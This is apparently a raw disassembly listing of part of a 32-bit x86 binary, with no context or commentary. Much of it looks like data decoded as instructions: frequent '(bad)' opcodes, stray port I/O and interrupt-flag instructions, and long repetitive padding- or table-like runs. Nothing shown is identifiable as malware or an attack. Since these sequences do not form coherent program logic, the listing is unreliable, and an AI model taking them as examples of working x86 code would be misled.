  414d14:	mov    ecx,0x98fd8432
  414d19:	pop    ds
  414d1a:	xor    esi,edx
  414d1c:	mov    dl,0x53
  414d1e:	adc    eax,edi
  414d20:	mov    esi,DWORD PTR [edx]
  414d22:	pop    ebp
  414d23:	sti    
  414d24:	jl     0x414d4a
  414d26:	gs sti 
  414d28:	xchg   ebp,eax
  414d29:	adc    eax,0x318e0411
  414d2e:	inc    ebp
  414d2f:	adc    al,0x0
  414d31:	scas   eax,DWORD PTR es:[edi]
  414d32:	jbe    0x414d18
  414d34:	pop    ds
  414d35:	test   DWORD PTR [ecx],edx
  414d37:	add    esi,DWORD PTR [eax+edx*2+0x1f]
  414d3b:	in     eax,dx
  414d3c:	jae    0x414d8e
  414d3e:	inc    esp
  414d3f:	(bad)  
  414d40:	pop    ds
  414d41:	dec    edx
  414d42:	push   edx
  414d43:	or     BYTE PTR [edi+0x3d],bl
  414d46:	inc    esp
  414d47:	idiv   edi
  414d49:	cs add esp,esp
  414d4c:	pop    ds
  414d4d:	cmp    DWORD PTR [eax],eax
  414d4f:	add    BYTE PTR [ebx-0x1],al
  414d52:	gs inc eax
  414d54:	sub    ecx,esi
  414d56:	jo     0x414d41
  414d58:	cmp    al,0xe8
  414d5a:	dec    edi
  414d5b:	cmp    dl,BYTE PTR ds:0x350d6bf1
  414d61:	div    BYTE PTR [ebx+0x19]
  414d64:	and    ah,bh
  414d66:	(bad)  
  414d67:	std    
  414d68:	inc    esi
  414d69:	ds data16 cli 
  414d6c:	cmp    edx,DWORD PTR [ecx+edx*2]
  414d6f:	push   cs
  414d70:	das    
  414d71:	or     BYTE PTR [ebp+0x8],dh
  414d74:	add    esi,ecx
  414d76:	pop    ebx
  414d77:	sbb    al,0xf2
  414d79:	loop   0x414da5
  414d7b:	mov    edx,0xbd73f61d
  414d80:	ins    BYTE PTR es:[edi],dx
  414d81:	call   0xf67dedd5
  414d86:	ins    BYTE PTR es:[edi],dx
  414d87:	lods   eax,DWORD PTR ds:[esi]
  414d88:	xor    ecx,0x1462bc73
  414d8e:	inc    esp
  414d8f:	enter  0xed5e,0x43
  414d93:	rol    BYTE PTR [eax+0x14],0x5c
  414d97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d98:	outs   dx,BYTE PTR ds:[esi]
  414d99:	in     al,0x46
  414d9b:	xchg   edi,eax
  414d9c:	adc    al,0xff
  414d9e:	(bad)  
  414d9f:	mov    ecx,0x8c76024f
  414da4:	and    al,ah
  414da6:	call   0x78:0x3e0e
  414dac:	mov    ebp,0xb54e0024
  414db1:	cmp    BYTE PTR [ecx+0x73],dh
  414db4:	add    BYTE PTR [eax],al
  414db6:	xchg   esi,eax
  414db7:	sub    DWORD PTR [ebp+eiz*2-0x38],ebp
  414dbb:	cs je  0x414e2e
  414dbe:	pop    ebx
  414dbf:	sub    DWORD PTR [ebp+eiz*2+0x3e],esi
  414dc3:	sub    DWORD PTR [esi+0x69],ebp
  414dc6:	cwde   
  414dc7:	dec    esi
  414dc8:	pop    ebp
  414dc9:	jae    0x414dcf
  414dcb:	jecxz  0x414e40
  414dcd:	outs   dx,DWORD PTR ds:[esi]
  414dce:	(bad)  
  414dcf:	sub    al,0x20
  414dd1:	inc    edx
  414dd2:	dec    edx
  414dd3:	daa    
  414dd4:	jae    0x414e49
  414dd6:	cmc    
  414dd7:	inc    ecx
  414dd8:	add    BYTE PTR [esi+0x24],al
  414ddb:	call   0x445cb72b
  414de0:	cs cmp bl,BYTE PTR fs:[eax]
  414de4:	pop    esp
  414de5:	dec    ebp
  414de6:	cmp    DWORD PTR [eax+0x6c],ecx
  414de9:	sbb    eax,DWORD PTR gs:[ecx+esi*2+0x64]
  414dee:	inc    ecx
  414def:	daa    
  414df0:	pop    esp
  414df1:	inc    ebx
  414df2:	and    BYTE PTR [edx+0x6b],al
  414df5:	ins    DWORD PTR es:[edi],dx
  414df6:	xor    eax,0x3b756be8
  414dfb:	adc    BYTE PTR [edi],ah
  414dfd:	inc    eax
  414dfe:	mov    BYTE PTR [eax],dl
  414e00:	mov    edi,0x6117d844
  414e05:	inc    esi
  414e06:	fcom   DWORD PTR [edi]
  414e08:	pop    ebx
  414e09:	dec    edx
  414e0a:	enter  0xd317,0x4d
  414e0e:	enter  0xfd17,0x4f
  414e12:	fcom   DWORD PTR [edi]
  414e14:	fist   DWORD PTR [eax+ebx*8+0x17]
  414e18:	aam    0x55
  414e1a:	add    BYTE PTR [eax],al
  414e1c:	enter  0xde17,0x56
  414e20:	enter  0x5917,0x58
  414e24:	cwde   
  414e25:	pop    ss
  414e26:	sbb    BYTE PTR [ecx+0x31],bl
  414e29:	mov    ebp,0xbd7a5d01
  414e2e:	add    eax,esp
  414e30:	je     0x414def
  414e32:	add    DWORD PTR [edx+0x51],esi
  414e35:	mov    ebp,0xbd522701
  414e3a:	add    DWORD PTR [edx+edx*2+0x52ed01bd],esi
  414e41:	cmp    eax,0x3d156704
  414e46:	add    al,0xeb
  414e48:	or     eax,0x17f0043d
  414e4d:	cmp    eax,0x3d0e1f04
  414e52:	add    al,0x91
  414e54:	sbb    edi,DWORD PTR ds:0x3d146904
  414e5a:	add    al,0x96
  414e5c:	push   cs
  414e5d:	cmp    eax,0x3d019204
  414e62:	add    al,0x4c
  414e64:	loopne 0x414ea2
  414e66:	add    al,0x49
  414e68:	jecxz  0x414ea6
  414e6a:	add    al,0x75
  414e6c:	in     eax,0x3c
  414e6e:	add    al,0x18
  414e70:	fnstcw WORD PTR [esp+eax*1]
  414e73:	pop    edi
  414e74:	leave  
  414e75:	cmp    al,0x4
  414e77:	(bad)  
  414e78:	leave  
  414e79:	cmp    al,0x4
  414e7b:	sbb    al,0xba
  414e7d:	cmp    al,0x4
  414e7f:	arpl   WORD PTR [eax],ax
  414e81:	add    BYTE PTR [edx-0x48b6fe44],bh
  414e87:	mov    esp,0xbcb85501
  414e8c:	add    DWORD PTR ds:0xda01bcab,esp
  414e92:	mov    edi,0xa65f01bc
  414e97:	mov    esp,0xbca91501
  414e9c:	add    DWORD PTR [esi+0x2301bc99],ebx
  414ea2:	cwde   
  414ea3:	adc    esp,DWORD PTR [edi-0x585362fd]
  414ea9:	add    ebp,DWORD PTR [ecx]
  414eab:	scas   al,BYTE PTR es:[edi]
  414eac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ead:	add    edi,ebx
  414eaf:	lods   eax,DWORD PTR ds:[esi]
  414eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eb1:	add    edi,DWORD PTR [ecx-0x51]
  414eb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eb5:	add    eax,DWORD PTR [ebx-0x25fc5852]
  414ebb:	scas   al,BYTE PTR es:[edi]
  414ebc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ebd:	add    eax,DWORD PTR [edx]
  414ebf:	mov    al,0xa7
  414ec1:	add    esp,ebp
  414ec3:	mov    esp,0xbcaa0427
  414ec8:	daa    
  414ec9:	add    al,0xb9
  414ecb:	into   
  414ecc:	daa    
  414ecd:	add    al,0xe6
  414ecf:	into   
  414ed0:	daa    
  414ed1:	add    al,0x8b
  414ed3:	into   
  414ed4:	daa    
  414ed5:	add    al,0x2
  414ed7:	enter  0x427,0xcf
  414edb:	(bad)  
  414edc:	daa    
  414edd:	add    al,0x64
  414edf:	(bad)  
  414ee0:	daa    
  414ee1:	add    al,0x29
  414ee3:	leave  
  414ee4:	daa    
  414ee5:	add    al,0x0
  414ee7:	add    dh,dl
  414ee9:	enter  0x427,0xef
  414eed:	leave  
  414eee:	daa    
  414eef:	add    al,0x81
  414ef1:	leave  
  414ef2:	daa    
  414ef3:	add    al,0x8b
  414ef5:	push   ebx
  414ef6:	daa    
  414ef7:	add    al,0x10
  414ef9:	push   ebp
  414efa:	daa    
  414efb:	add    al,0xd2
  414efd:	push   esp
  414efe:	daa    
  414eff:	add    al,0x5a
  414f01:	push   esp
  414f02:	daa    
  414f03:	add    al,0xed
  414f05:	push   esi
  414f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f07:	add    edx,ebx
  414f09:	push   ebp
  414f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f0b:	add    eax,DWORD PTR [eax+0x50]
  414f0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f0f:	add    ecx,DWORD PTR [edi+0x4f]
  414f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f13:	add    ecx,ecx
  414f15:	dec    edi
  414f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f17:	add    esp,DWORD PTR [edx+0x5b]
  414f1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f1b:	add    ebx,ebx
  414f1d:	pop    ebx
  414f1e:	add    BYTE PTR [ecx-0x5634dfce],ch
  414f24:	xor    cl,BYTE PTR [ebx+ecx*8]
  414f27:	test   eax,0xa9cee432
  414f2c:	xor    ch,bl
  414f2e:	shr    BYTE PTR [ecx-0x562c53ce],1
  414f34:	xor    ch,BYTE PTR [ecx-0x2d]
  414f37:	test   eax,0xa9d7e532
  414f3c:	xor    ch,BYTE PTR [edx+0x2832a9d8]
  414f42:	xlat   BYTE PTR ds:[ebx]
  414f43:	test   eax,0x29d79b32
  414f48:	xor    eax,0x29da11
  414f4d:	add    BYTE PTR ds:0x3529da8f,ch
  414f53:	adc    al,0x0
  414f55:	jmp    0xe941638c
  414f5a:	xor    dl,BYTE PTR [eax+eax*1]
  414f5d:	jmp    0xe9416394
  414f62:	xor    dl,BYTE PTR [eax+eax*1]
  414f65:	jmp    0x10ad229c
  414f6a:	push   ss
  414f6b:	cli    
  414f6c:	jae    0x414f37
  414f6e:	cli    
  414f6f:	call   0xe37650e4
  414f74:	push   ebx
  414f75:	sub    BYTE PTR [ecx],bl
  414f77:	in     eax,0x50
  414f79:	aam    0xfb
  414f7b:	fmul   QWORD PTR [edi+0x2e]
  414f7e:	(bad)  
  414f7f:	fild   QWORD PTR [edx]
  414f81:	es in  al,dx
  414f83:	adc    esp,DWORD PTR [ebx]
  414f85:	add    eax,0xcc77f643
  414f8a:	xor    dh,BYTE PTR ds:0x14651b30
  414f90:	je     0x414f6d
  414f92:	inc    edi
  414f93:	cmc    
  414f94:	(bad)  
  414f95:	mov    ebp,0x2df04b
  414f9a:	cli    
  414f9b:	xor    eax,0x1e010074
  414fa0:	or     DWORD PTR [edx],ecx
  414fa2:	adc    eax,0x2200517
  414fa7:	inc    esp
  414fa8:	jno    0x41501b
  414faa:	clc    
  414fab:	sbb    DWORD PTR [edx],ecx
  414fad:	and    BYTE PTR [ecx+esi*1+0x206c],ch
  414fb4:	shl    DWORD PTR [ecx+0x2e],1
  414fb7:	and    al,ch
  414fb9:	sbb    DWORD PTR [edx],ecx
  414fbb:	or     DWORD PTR [ecx-0x7f6dfc6],esp
  414fc1:	xor    DWORD PTR [eax+0x69],edi
  414fc4:	cmp    esp,DWORD PTR [ecx]
  414fc6:	and    BYTE PTR [ecx],cl
  414fc8:	call   0x38727241
  414fcd:	sbb    eax,0x42ef2020
  414fd2:	je     0x415043
  414fd4:	sub    BYTE PTR ds:0x24fd6f20,bl
  414fda:	add    eax,0x6174820d
  414fdf:	gs hlt 
  414fe1:	outs   dx,DWORD PTR ds:[esi]
  414fe2:	push   es
  414fe3:	and    BYTE PTR ds:0x28001d60,ch
  414fe9:	jo     0x41500a
  414feb:	and    eax,0x201d724b
  414ff0:	js     0x415066
  414ff2:	sbb    eax,0x61381b00
  414ff7:	ins    BYTE PTR es:[edi],dx
  414ff8:	push   esp
  414ff9:	shl    DWORD PTR [edi+0x65],1
  414ffc:	cmp    esp,DWORD PTR [ecx]
  414ffe:	je     0x415065
  415000:	sbb    DWORD PTR [eax],edx
  415002:	outs   dx,DWORD PTR ds:[esi]
  415003:	push   0x336c442d
  415008:	jp     0x414f8c
  41500a:	popa   
  41500b:	ins    BYTE PTR es:[edi],dx
  41500c:	add    al,0x14
  41500e:	popa   
  41500f:	js     0x415019
  415011:	cmp    BYTE PTR [ebx+0x72],ch
  415014:	xor    DWORD PTR [eax+0x13],ebx
  415017:	add    BYTE PTR cs:[eax],al
  41501a:	mov    WORD PTR [ebp+0x26],fs
  41501d:	add    BYTE PTR [edx+0x20],ah
  415020:	shr    DWORD PTR [edx],1
  415022:	cmp    al,0x18
  415024:	shl    DWORD PTR [edi],1
  415026:	xor    DWORD PTR [ebp+0x1],edi
  415029:	add    BYTE PTR [ecx],dh
  41502b:	stos   BYTE PTR es:[edi],al
  41502c:	es inc edi
  41502e:	pop    esp
  41502f:	lods   eax,DWORD PTR ds:[esi]
  415030:	es jb  0x415095
  415033:	xchg   esi,eax
  415034:	das    
  415035:	pop    edi
  415036:	gs cwde 
  415038:	xor    DWORD PTR [edx+0x48],esi
  41503b:	lahf   
  41503c:	sub    ch,BYTE PTR [esp+edx*2-0x6a]
  415040:	add    BYTE PTR es:[edx-0x70],ah
  415044:	xor    eax,0x13ad5361
  415049:	addr16 aas 
  41504b:	xchg   esp,eax
  41504c:	sub    eax,0x3d81663
  415051:	push   ecx
  415052:	or     al,0x3a
  415054:	sub    al,0x5f
  415056:	(bad)  
  415058:	es dec esi
  41505a:	push   es
  41505b:	loope  0x415087
  41505d:	data16 or BYTE PTR ds:0xe3ff6712,ch
  415064:	das    
  415065:	arpl   WORD PTR [esi],dx
  415067:	fadd   DWORD PTR [ebx]
  415069:	push   ecx
  41506a:	or     al,0x3a
  41506c:	adc    ah,BYTE PTR [ebx-0x30]
  41506f:	sub    BYTE PTR [edi],ah
  415071:	push   esp
  415072:	(bad)  
  415073:	and    DWORD PTR [edi],esp
  415075:	outs   dx,BYTE PTR ds:[esi]
  415076:	add    DWORD PTR [ebx],ebp
  415078:	sub    esi,DWORD PTR [esi-0x38]
  41507b:	mov    BYTE PTR [eax],ch
  41507d:	add    BYTE PTR gs:[eax],al
  415080:	aam    0x7c
  415082:	xor    ah,BYTE PTR [ebx-0xd]
  415085:	sbb    esp,DWORD PTR [ecx]
  415087:	imul   eax,esp,0xc872318c
  41508d:	jle    0x4150bb
  41508f:	ins    BYTE PTR es:[edi],dx
  415090:	xchg   esp,eax
  415091:	adc    al,0xce
  415093:	sub    BYTE PTR [ecx],dh
  415095:	jecxz  0x41505a
  415097:	xor    DWORD PTR [edx-0x5cd124fd],edx
  41509d:	icebp  
  41509e:	mov    dh,0x11
  4150a0:	xchg   esi,eax
  4150a1:	dec    bh
  4150a3:	das    
  4150a4:	xchg   edx,eax
  4150a5:	out    dx,eax
  4150a6:	ret    
  4150a7:	add    esp,DWORD PTR [eax-0xf]
  4150aa:	lahf   
  4150ab:	sub    eax,0x24c40290
  4150b0:	pusha  
  4150b1:	icebp  
  4150b2:	mov    bh,0x18
  4150b4:	push   esp
  4150b5:	add    BYTE PTR [eax-0x63029ccd],cl
  4150bb:	sub    al,0x45
  4150bd:	icebp  
  4150be:	test   DWORD PTR [eax],ebp
  4150c0:	xor    ebx,esp
  4150c2:	mov    eax,DWORD PTR [eax+eax*2+0x3]
  4150c6:	nop
  4150c7:	es dec edi
  4150c9:	in     al,0x78
  4150cb:	sub    al,0x4a
  4150cd:	cmc    
  4150ce:	js     0x4150ec
  4150d0:	add    eax,0x172951f7
  4150d5:	in     al,0x58
  4150d7:	sub    eax,0x2942fd27
  4150dc:	or     al,0xf1
  4150de:	out    0x3,al
  4150e0:	xor    DWORD PTR [edi+eiz*8],edx
  4150e3:	add    eax,DWORD PTR [eax]
  4150e5:	add    BYTE PTR [ecx],dh
  4150e7:	adc    al,0xe7
  4150e9:	add    esi,DWORD PTR [ecx]
  4150eb:	adc    al,0xe7
  4150ed:	add    esi,DWORD PTR [ecx]
  4150ef:	adc    al,0xe7
  4150f1:	add    esi,DWORD PTR [ecx]
  4150f3:	adc    al,0xe7
  4150f5:	add    esi,DWORD PTR [ecx]
  4150f7:	adc    al,0xe7
  4150f9:	add    esi,DWORD PTR [ecx]
  4150fb:	adc    al,0xe7
  4150fd:	add    esi,DWORD PTR [ecx]
  4150ff:	adc    al,0xe7
  415101:	add    esi,DWORD PTR [ecx]
  415103:	adc    al,0xe7
  415105:	add    esi,DWORD PTR [ecx]
  415107:	adc    al,0xe7
  415109:	add    esi,DWORD PTR [ecx]
  41510b:	adc    al,0x0
  41510d:	jmp    0xe9416544
  415112:	xor    dl,BYTE PTR [eax+eax*1]
  415115:	jmp    0xe941654c
  41511a:	xor    dl,BYTE PTR [eax+eax*1]
  41511d:	jmp    0xe9416554
  415122:	xor    dl,BYTE PTR [eax+eax*1]
  415125:	jmp    0xe941655c
  41512a:	xor    dl,BYTE PTR [eax+eax*1]
  41512d:	jmp    0xe9416564
  415132:	xor    dl,BYTE PTR [eax+eax*1]
  415135:	jmp    0xe941656c
  41513a:	xor    dl,BYTE PTR [eax+eax*1]
  41513d:	jmp    0xe9416574
  415142:	xor    dl,BYTE PTR [eax+eax*1]
  415145:	jmp    0xe941657c
  41514a:	add    BYTE PTR [eax],al
  41514c:	xor    dl,BYTE PTR [eax+eax*1]
  41514f:	jmp    0xe9416586
  415154:	xor    dl,BYTE PTR [eax+eax*1]
  415157:	jmp    0xe941658e
  41515c:	xor    dl,BYTE PTR [eax+eax*1]
  41515f:	jmp    0xe9416596
  415164:	xor    dl,BYTE PTR [eax+eax*1]
  415167:	jmp    0xe941659e
  41516c:	xor    dl,BYTE PTR [eax+eax*1]
  41516f:	jmp    0xe94165a6
  415174:	xor    dl,BYTE PTR [eax+eax*1]
  415177:	jmp    0xe94165ae
  41517c:	xor    dl,BYTE PTR [eax+eax*1]
  41517f:	jmp    0xe94165b6
  415184:	xor    dl,BYTE PTR [eax+eax*1]
  415187:	add    BYTE PTR [eax+0x11],bl
  41518a:	add    BYTE PTR [eax],al
  41518c:	dec    eax
  41518d:	adc    DWORD PTR [eax],eax
  41518f:	add    BYTE PTR [eax+0x11],cl
  415192:	add    BYTE PTR [eax],al
  415194:	sbb    BYTE PTR [ecx],dl
  415196:	add    BYTE PTR [eax],al
  415198:	sbb    BYTE PTR [ecx],dl
  41519a:	add    BYTE PTR [eax],al
  41519c:	or     BYTE PTR [ecx],dl
  41519e:	add    BYTE PTR [eax],al
  4151a0:	or     BYTE PTR [ecx],dl
  4151a2:	add    BYTE PTR [eax],al
  4151a4:	sbb    BYTE PTR [ecx],dl
  4151a6:	add    BYTE PTR [eax],al
  4151a8:	sbb    BYTE PTR [ecx],dl
  4151aa:	add    BYTE PTR [eax],al
  4151ac:	or     BYTE PTR [ecx],dl
  4151ae:	add    BYTE PTR [eax],al
  4151b0:	add    BYTE PTR [eax],al
  4151b2:	or     BYTE PTR [ecx],dl
  4151b4:	add    BYTE PTR [eax],al
  4151b6:	fcom   DWORD PTR [eax]
  4151b8:	add    BYTE PTR [eax],al
  4151ba:	fcom   DWORD PTR [eax]
  4151bc:	add    BYTE PTR [eax],al
  4151be:	enter  0x10,0x0
  4151c2:	enter  0x10,0x0
  4151c6:	fcom   DWORD PTR [eax]
  4151c8:	add    BYTE PTR [eax],al
  4151ca:	fcom   DWORD PTR [eax]
  4151cc:	add    BYTE PTR [eax],al
  4151ce:	enter  0x10,0x0
  4151d2:	enter  0x10,0x0
  4151d6:	cwde   
  4151d7:	adc    BYTE PTR [eax],al
  4151d9:	add    BYTE PTR [eax-0x77fffff0],bl
  4151df:	adc    BYTE PTR [eax],al
  4151e1:	add    BYTE PTR [eax-0x67fffff0],cl
  4151e7:	adc    BYTE PTR [eax],al
  4151e9:	add    BYTE PTR [eax-0x77fffff0],bl
  4151ef:	adc    BYTE PTR [eax],al
  4151f1:	add    BYTE PTR [eax+0x58000010],cl
  4151f7:	adc    BYTE PTR [eax],al
  4151f9:	add    BYTE PTR [eax+0x10],bl
  4151fc:	add    BYTE PTR [eax],al
  4151fe:	dec    eax
  4151ff:	adc    BYTE PTR [eax],al
  415201:	add    BYTE PTR [ecx],dh
  415203:	jnp    0x415206
  415205:	add    BYTE PTR [ecx],dh
  415207:	jnp    0x41520a
  415209:	add    BYTE PTR [ecx],dh
  41520b:	jnp    0x41520e
  41520d:	add    BYTE PTR [ecx],dh
  41520f:	jnp    0x415212
  415211:	add    BYTE PTR [ecx],dh
  415213:	jnp    0x415216
  415215:	add    BYTE PTR [eax],al
  415217:	add    BYTE PTR [ecx],dh
  415219:	ins    DWORD PTR es:[edi],dx
  41521a:	add    DWORD PTR [eax],eax
  41521c:	xor    DWORD PTR [ebp+0x1],ebp
  41521f:	add    BYTE PTR [ecx],dh
  415221:	ins    DWORD PTR es:[edi],dx
  415222:	add    DWORD PTR [eax],eax
  415224:	xor    DWORD PTR [ebp+0x1],ebp
  415227:	add    BYTE PTR [ecx],dh
  415229:	ins    DWORD PTR es:[edi],dx
  41522a:	add    DWORD PTR [eax],eax
  41522c:	xor    DWORD PTR [ebp+0x1],ebp
  41522f:	add    BYTE PTR [ecx],dh
  415231:	ins    DWORD PTR es:[edi],dx
  415232:	add    DWORD PTR [eax],eax
  415234:	xor    DWORD PTR [ebp+0x1],ebp
  415237:	add    BYTE PTR [ecx],dh
  415239:	ins    DWORD PTR es:[edi],dx
  41523a:	add    DWORD PTR [eax],eax
  41523c:	xor    DWORD PTR [ebp+0x1],ebp
  41523f:	add    BYTE PTR [ecx],dh
  415241:	ins    DWORD PTR es:[edi],dx
  415242:	add    DWORD PTR [eax],eax
  415244:	xor    DWORD PTR [ebp+0x1],ebp
  415247:	add    BYTE PTR [ecx],dh
  415249:	ins    DWORD PTR es:[edi],dx
  41524a:	add    DWORD PTR [eax],eax
  41524c:	xor    DWORD PTR [ebp+0x1],ebp
  41524f:	add    BYTE PTR [ecx],dh
  415251:	ins    DWORD PTR es:[edi],dx
  415252:	add    DWORD PTR [eax],eax
  415254:	xor    DWORD PTR [ebp+0x1],ebp
  415257:	add    BYTE PTR [ecx],dh
  415259:	ins    DWORD PTR es:[edi],dx
  41525a:	add    DWORD PTR [eax],eax
  41525c:	xor    DWORD PTR [ebp+0x1],ebp
  41525f:	add    BYTE PTR [ecx],dh
  415261:	ins    DWORD PTR es:[edi],dx
  415262:	add    DWORD PTR [eax],eax
  415264:	xor    DWORD PTR [ebp+0x1],ebp
  415267:	add    BYTE PTR [ecx],dh
  415269:	ins    DWORD PTR es:[edi],dx
  41526a:	add    DWORD PTR [eax],eax
  41526c:	xor    DWORD PTR [esi+eiz*8+0x42],ebp
  415270:	push   ss
  415271:	add    al,0x6d
  415273:	retf   
  415274:	xchg   bl,cl
  415276:	mov    eax,0x304bc9ba
  41527b:	xor    al,BYTE PTR [eax]
  41527d:	add    BYTE PTR [ecx+0x14],al
  415280:	jo     0x4152f1
  415282:	push   0x73
  415284:	call   0x673c466f
  415289:	add    al,0xf1
  41528b:	adc    eax,edi
  41528d:	add    esp,DWORD PTR [ecx]
  41528f:	adc    al,0xef
  415291:	add    esi,DWORD PTR ds:0x3603e914
  415297:	and    edi,0x3
  41529a:	mov    cl,0x13
  41529c:	out    0x3,eax
  41529e:	jno    0x4152b4
  4152a0:	out    0x3,eax
  4152a2:	push   ecx
  4152a3:	adc    al,0xe7
  4152a5:	add    eax,DWORD PTR [ecx+0x14]
  4152a8:	out    0x3,eax
  4152aa:	cmp    DWORD PTR [edi+eiz*8],edx
  4152ad:	add    ebp,DWORD PTR ds:0x3303e714
  4152b3:	adc    al,0xe7
  4152b5:	add    esi,esi
  4152b7:	and    bh,0x83
  4152ba:	xor    DWORD PTR [edi+eiz*8],edx
  4152bd:	inc    ebx
  4152be:	xor    DWORD PTR [edi+eiz*8],edx
  4152c1:	jecxz  0x4152a1
  4152c3:	and    bh,0xf3
  4152c6:	(bad)  
  4152c7:	and    bh,0xb
  4152ca:	xor    DWORD PTR [edi+eiz*8],edx
  4152cd:	inc    esi
  4152cf:	and    bh,0x5
  4152d2:	xor    DWORD PTR [edi+eiz*8],edx
  4152d5:	add    al,0x31
  4152d7:	adc    al,0x67
  4152d9:	add    al,0x31
  4152db:	adc    al,0xa7
  4152dd:	add    esi,DWORD PTR [ecx]
  4152df:	adc    al,0x7
  4152e1:	add    al,0x0
  4152e3:	add    BYTE PTR [ecx],dh
  4152e5:	adc    al,0xf7
  4152e7:	add    esi,DWORD PTR [ecx]
  4152e9:	adc    al,0xdf
  4152eb:	add    esi,DWORD PTR [ecx]
  4152ed:	adc    al,0xe3
  4152ef:	add    esi,DWORD PTR [ecx]
  4152f1:	adc    al,0xe9
  4152f3:	add    esi,DWORD PTR [ecx]
  4152f5:	adc    al,0xe8
  4152f7:	add    esi,DWORD PTR [ecx]
  4152f9:	adc    al,0x0
  4152fb:	icebp  
  4152fc:	cmp    BYTE PTR [edx],0x20
  4152ff:	shl    DWORD PTR [edx+0x1a],1
  415302:	add    al,ah
  415304:	test   DWORD PTR [ecx],edi
  415306:	pop    ds
  415307:	add    BYTE PTR [ecx+ebx*1-0x1],bl
  41530b:	shl    BYTE PTR [esp+ebp*1+0x22],cl
  41530f:	repz cmp al,0xc
  415312:	add    al,dl
  415314:	sub    esp,DWORD PTR [bx+di]
  415317:	mov    edi,0xd7263060
  41531c:	and    BYTE PTR [eax],dl
  41531e:	push   es
  41531f:	lods   al,BYTE PTR ds:[esi]
  415320:	add    DWORD PTR [edi],ebp
  415322:	and    eax,DWORD PTR [eax+eiz*1]
  415325:	lsl    ebx,WORD PTR ds:0xf5242e01
  41532c:	push   ds
  41532d:	push   cs
  41532e:	add    al,0xf2
  415330:	dec    DWORD PTR [ecx+eax*1]
  415333:	call   0xf1476b6c
  415338:	and    al,0x10
  41533a:	push   cs
  41533b:	out    0xe5,al
  41533d:	and    al,0x13
  41533f:	(bad)  
  415340:	in     eax,0x1c
  415342:	sbb    al,0xf4
  415344:	loop   0x415351
  415346:	adc    eax,0xd60000e9
  41534b:	adc    ebx,DWORD PTR [ecx]
  41534d:	out    0x31,eax
  41534f:	sub    BYTE PTR [edi],al
  415351:	idiv   DWORD PTR [esp+ecx*1+0xf33e001]
  415358:	push   es
  415359:	jecxz  0x41531a
  41535b:	or     eax,0x1f87c0ff
  415360:	and    al,0xbf
  415362:	sbb    BYTE PTR [esi],0x25
  415365:	sbb    ecx,DWORD PTR [ecx+0x7d122d21]
  41536b:	aaa    
  41536c:	xor    eax,0x272e6108
  415371:	sbb    BYTE PTR [ebp+ebx*1-0x7e77ffe3],cl
  415378:	inc    BYTE PTR [eax]
  41537a:	mov    BYTE PTR ds:0x15580000,dl
  415380:	std    
  415381:	dec    DWORD PTR [ecx+eax*4-0x2]
  415385:	add    BYTE PTR [ebp+edx*1-0x3],cl
  415389:	add    BYTE PTR [ecx+eax*4-0x2],cl
  41538d:	call   FWORD PTR [ebp+edx*1+0x0]
  415391:	add    BYTE PTR [eax+0x15],bl
  415394:	std    
  415395:	dec    DWORD PTR [eax-0x7f]
  415398:	std    
  415399:	dec    DWORD PTR [eax-0x7f]
  41539c:	inc    BYTE PTR [eax]
  41539e:	sbb    al,0x81
  4153a0:	inc    BYTE PTR [eax]
  4153a2:	sbb    BYTE PTR [ecx-0x7ef30003],al
  4153a8:	std    
  4153a9:	add    BYTE PTR [edx*1+0xfd],cl
  4153b0:	sbb    BYTE PTR ds:0x150c0100,dl
  4153b6:	add    BYTE PTR [eax],al
  4153b8:	or     al,0x81
  4153ba:	std    
  4153bb:	dec    DWORD PTR [eax]
  4153bd:	cmp    ebp,0xfd80d800
  4153c3:	add    al,bl
  4153c5:	cmp    dh,0xff
  4153c8:	enter  0xfe80,0xff
  4153cc:	enter  0xfd14,0x0
  4153d0:	fcom   DWORD PTR [edi*8-0x27f3400]
  4153d7:	add    ah,cl
  4153d9:	adc    al,0xfd
  4153db:	dec    esp
  4153dd:	adc    al,0x0
  4153df:	add    DWORD PTR [esp+edx*1+0x148c0100],ebx
  4153e6:	std    
  4153e7:	dec    DWORD PTR [eax-0x73ffffec]
  4153ed:	cmp    ch,0xff
  4153f0:	xor    DWORD PTR [edi-0x3],ebp
  4153f3:	inc    BYTE PTR [esi+0x3000016a]
  4153f9:	imul   eax,DWORD PTR [ecx],0xffffffff
  4153fc:	jbe    0x415474
  4153fe:	std    
  4153ff:	(bad)  
  415400:	xor    DWORD PTR [edi+0x1],ebp
  415403:	add    BYTE PTR [ecx],dh
  415405:	imul   eax,DWORD PTR [ecx],0xffffffff
  415408:	xor    DWORD PTR [ebx-0x3],ebp
  41540b:	(bad)  
  41540c:	xor    DWORD PTR [ebx+0x1],ebp
  41540f:	add    BYTE PTR [eax],dh
  415411:	imul   eax,DWORD PTR [ecx],0x0
  415414:	add    BYTE PTR [eax],al
  415416:	xor    BYTE PTR [ebx-0x3],ch
  415419:	(bad)  
  41541a:	outs   dx,BYTE PTR ds:[esi]
  41541c:	add    edi,edi
  41541e:	xor    DWORD PTR [ebx+0x1],ebp
  415421:	jmp    FWORD PTR [esi]
  415423:	outs   dx,BYTE PTR ds:[esi]
  415424:	std    
  415425:	(bad)  
  415426:	es jp  0x41542a
  415429:	add    BYTE PTR [eax],dh
  41542b:	ins    DWORD PTR es:[edi],dx
  41542c:	std    
  41542d:	call   DWORD PTR [esi]
  41542f:	jp     0x415432
  415431:	add    BYTE PTR [ecx],dh
  415433:	jno    0x415432
  415435:	push   DWORD PTR [ecx]
  415437:	jns    0x415436
  415439:	(bad)  
  41543a:	(bad)  
  41543b:	jno    0x41543a
  41543d:	(bad)  
  41543e:	xor    DWORD PTR [ecx+0x1],edi
  415441:	(bad)  
  415442:	out    dx,al
  415443:	ins    DWORD PTR es:[edi],dx
  415444:	add    edi,edi
  415446:	xor    DWORD PTR [ecx-0x3],edi
  415449:	push   DWORD PTR [ecx]
  41544b:	jno    0x41544e
